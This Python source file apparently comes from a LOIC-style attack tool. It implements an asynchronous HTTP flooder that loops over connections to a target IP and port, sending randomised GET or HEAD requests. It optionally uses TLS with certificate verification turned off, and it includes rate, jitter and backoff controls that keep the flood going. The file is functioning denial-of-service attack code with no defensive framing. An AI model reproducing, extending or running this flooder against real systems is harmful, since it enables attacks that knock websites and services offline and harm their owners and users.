from __future__ import annotations

import asyncio
import logging
import ssl
import time
from loic.flooders.base import AsyncFlooder
from loic.config import AttackConfig
from loic.functions import random_http_header
from loic.req_state import ReqState

logger = logging.getLogger(__name__)


class HTTPFlooder(AsyncFlooder):
    def __init__(self, config: AttackConfig):
        super().__init__()
        self.host = config.effective_host()
        self.ip = config.target_ip
        self.port = config.port
        self.subsite = config.subsite
        self.resp = config.wait_reply
        self._delay = config.delay
        self.timeout = max(config.timeout, 1)
        self.random_sub = config.random_sub
        self.use_get = config.use_get
        self.gzip = config.allow_gzip
        self.ipv6 = config.ipv6
        self.use_tls = config.use_tls
        self.verify_response = config.verify_response
        self.jitter = config.jitter
        self.rate_limit = config.rate_limit
        self.extra_headers = config.extra_headers
        self._consecutive_failures: int = 0
        self._max_consecutive: int = 50
        self._backoff_until: float = 0.0

    async def _run(self):
        method = "GET" if self.use_get else "HEAD"
        family = asyncio.streams.socket.AF_INET6 if self.ipv6 else asyncio.streams.socket.AF_INET
        addr = (self.ip, self.port)
        delay_sec = (self._delay + 1) / 1000.0 if self._delay >= 0 else 0.001
        timeout_sec = float(self.timeout)

        while self._is_flooding:
            if time.monotonic() < self._backoff_until:
                await asyncio.sleep(0.5)
                continue

            self.state = ReqState.CONNECTING
            t_start = time.monotonic()
            reader = writer = None

            try:
                if self.use_tls:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.host, self.port, ssl=ctx, family=family),
                        timeout=timeout_sec,
                    )
                else:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.ip, self.port, family=family),
                        timeout=timeout_sec,
                    )

                self.state = ReqState.REQUESTING
                buf = random_http_header(
                    method, self.subsite, self.host,
                    self.random_sub, self.gzip, 300,
                    headers=self.extra_headers if self.extra_headers else None,
                )

                writer.write(buf)
                await writer.drain()

                self.requested += 1
                self.state = ReqState.DOWNLOADING

                if self.resp:
                    response_data = await asyncio.wait_for(
                        reader.read(4096), timeout=timeout_sec
                    )
                    if response_data:
                        self.bytes_received += len(response_data)
                        self.downloaded += 1

                        if self.verify_response:
                            self._parse_status(response_data)

                        latency = time.monotonic() - t_start
                        self.record_latency(latency)
                    else:
                        self.failed += 1
                else:
                    self.downloaded += 1
                    latency = time.monotonic() - t_start
                    self.record_latency(latency)

                self.state = ReqState.COMPLETED
                self._consecutive_failures = 0

            except asyncio.TimeoutError:
                self.failed += 1
                self.state = ReqState.FAILED
                self._consecutive_failures += 1
                self._check_backoff()
            except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError, OSError) as e:
                self.failed += 1
                self.state = ReqState.FAILED
                self._consecutive_failures += 1
                self._check_backoff()
                logger.debug("HTTP connection error: %s", e)
            except asyncio.CancelledError:
                raise
            except Exception as e:
                self.failed += 1
                self.state = ReqState.FAILED
                logger.debug("HTTP unexpected error: %s", e)
            finally:
                if writer:
                    try:
                        writer.close()
                        await writer.wait_closed()
                    except Exception:
                        pass

            self.state = ReqState.IDLE

            if self.rate_limit > 0:
                await asyncio.sleep(max(0.001, 1.0 / self.rate_limit))
            elif delay_sec > 0:
                jitter_sec = self.jitter * (asyncio.get_event_loop().time() % 1) * 0.001 if self.jitter > 0 else 0
                await asyncio.sleep(delay_sec + jitter_sec)

    def _parse_status(self, data: bytes):
        try:
            first_line = data.split(b"\r\n")[0].decode("ascii", errors="ignore")
            parts = first_line.split(" ", 2)
            if len(parts) >= 2:
                code = int(parts[1])
                self.status_codes[code] = self.status_codes.get(code, 0) + 1
        except (ValueError, IndexError):
            pass

    def _check_backoff(self):
        if self._consecutive_failures >= self._max_consecutive:
            self._backoff_until = time.monotonic() + 5.0
            self._consecutive_failures = 0
            logger.warning("HTTP flooder backing off for 5s after %d failures", self._max_consecutive)